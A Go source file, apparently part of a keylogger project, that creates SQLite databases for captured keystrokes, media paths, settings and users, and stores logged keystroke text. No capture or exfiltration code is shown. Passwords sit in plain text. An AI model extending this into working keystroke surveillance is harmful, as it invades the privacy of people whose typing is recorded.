package main

import (
	"database/sql"
	_ "github.com/mattn/go-sqlite3"
	"log"
)

// Create Keylogger Database and Table if it doesn't exist
func createKeyloggerDatabase() error {
	// Open a connection to the database
	db, err := sql.Open("sqlite3", "DB/keylogger.db")
	if err != nil {
		return err
	}
	defer func(db *sql.DB) {
		err := db.Close()
		if err != nil {
			log.Println(err)
		}
	}(db)

	if db == nil {
		log.Println("Database does not exist")
	}
	// Execute the SQL command to create the table
	_, err = db.Exec(`
		CREATE TABLE keystrokes (
			id INTEGER PRIMARY KEY AUTOINCREMENT,
			textStuff TEXT NOT NULL,
			created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
		)
	`)
	if err != nil {
		return err
	}
	log.Printf("Database created successfully")

	return nil
}

// Create Local Media Database and Table if it doesn't exist
func createLocalMediaDatabase() error {
	// Open a connection to the database
	db, err := sql.Open("sqlite3", "DB/localMedia.db")
	if err != nil {
		return err
	}
	defer func(db *sql.DB) {
		err := db.Close()
		if err != nil {
			log.Println(err)
		}
	}(db)

	if db == nil {
		log.Println("Database does not exist")
	}
	// Execute the SQL command to create the table
	_, err = db.Exec(`
		CREATE TABLE localMedia (
			id INTEGER PRIMARY KEY AUTOINCREMENT,
			path TEXT NOT NULL,
			created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
		)
	`)
	if err != nil {
		return err
	}
	log.Printf("Database created successfully")

	return nil
}

// Create Settings Database and Table if it doesn't exist
func createSettingsDatabase() error {
	// Open a connection to the database
	db, err := sql.Open("sqlite3", "DB/settings.db")
	if err != nil {
		return err
	}
	defer func(db *sql.DB) {
		err := db.Close()
		if err != nil {
			log.Println(err)
		}
	}(db)

	if db == nil {
		log.Println("Database does not exist")
	}
	// Execute the SQL command to create the table
	_, err = db.Exec(`
		CREATE TABLE settings (
			id INTEGER PRIMARY KEY AUTOINCREMENT,
			enabled INTEGER NOT NULL,
			created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
		)
	`)
	if err != nil {
		return err
	}
	log.Printf("Database created successfully")

	return nil
}

// Create User Database and Table if it doesn't exist
func createUserDatabase() error {
	// Open a connection to the database
	db, err := sql.Open("sqlite3", "DB/user.db")
	if err != nil {
		return err
	}
	defer func(db *sql.DB) {
		err := db.Close()
		if err != nil {
			log.Println(err)
		}
	}(db)

	if db == nil {
		log.Println("Database does not exist")
	}
	// Execute the SQL command to create the table
	_, err = db.Exec(`
		CREATE TABLE user (
			id INTEGER PRIMARY KEY AUTOINCREMENT,
			username TEXT NOT NULL,
			password TEXT NOT NULL,
			created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
		)
	`)
	if err != nil {
		return err
	}
	log.Printf("Database created successfully")

	return nil
}

func kitchenLog(keylogger string) {
	//Store the keylogger in a file
	db, err := sql.Open("sqlite3", "DB/keylogger.db")
	if err != nil {
		log.Printf("Error opening database: %v", err)
	}
	defer func(db *sql.DB) {
		err := db.Close()
		if err != nil {
			log.Println(err)
		}

	}(db)

	// Insert the keylogger into the database
	_, err = db.Exec("INSERT INTO keystrokes (textStuff) VALUES (?)", keylogger)
	if err != nil {
		log.Printf("Error inserting into database: %v", err)
	}
}

func dbInit() {
	majorKeys := createKeyloggerDatabase()
	if majorKeys != nil {
		return
	}
}
